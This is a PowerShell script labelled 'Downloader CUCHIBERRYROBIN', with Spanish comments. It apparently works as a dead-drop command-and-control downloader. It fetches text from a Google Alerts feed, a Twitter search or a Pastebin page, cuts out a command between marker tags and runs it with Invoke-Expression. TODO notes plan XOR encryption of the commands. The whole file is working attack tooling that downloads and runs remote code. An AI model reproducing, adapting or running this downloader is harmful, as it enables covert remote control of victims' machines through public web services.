#Downloader CUCHIBERRYROBIN

$content = Invoke-WebRequest -Uri "https://www.google.es/alerts/feeds/14322507702556587554/7498838164931141655" -UseBasicParsing
$patron = '(?<=#CUCHIROBIN )(.*)(?= #FIN)'
$resultado = [regex]::Match($content, $patron).Value


#SEGUNDA OPCION #TODO CIPHER XOR
if (([string]::IsNullOrEmpty($resultado)))
{
$content = Invoke-WebRequest -Uri "https://api.twitter.com/1.1/search/tweets.json?q=%23#CUCHIBERRYROBIN&count=1" -UseBasicParsing
$content= $content.statuses[0].text
$patron = '(?<=#CUCHIROBIN )(.*)(?= #FIN)'
$resultado = [regex]::Match($content, $patron).Value
}

#TerceraA OPCION #TODO CIPHER XOR
if (([string]::IsNullOrEmpty($resultado)))
{
$content = Invoke-WebRequest -Uri "https://pastebin.com/ABiV0rH7" -UseBasicParsing
$patron = '(?<=#CUCHIROBIN )(.*)(?= #FIN)'
$resultado = [regex]::Match($content, $patron).Value
}



$Title = "CuchiBerryRObin"
$Message = "Descargando comando $resultado"
$Type = "info" 
  
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
Invoke-Expression $resultado



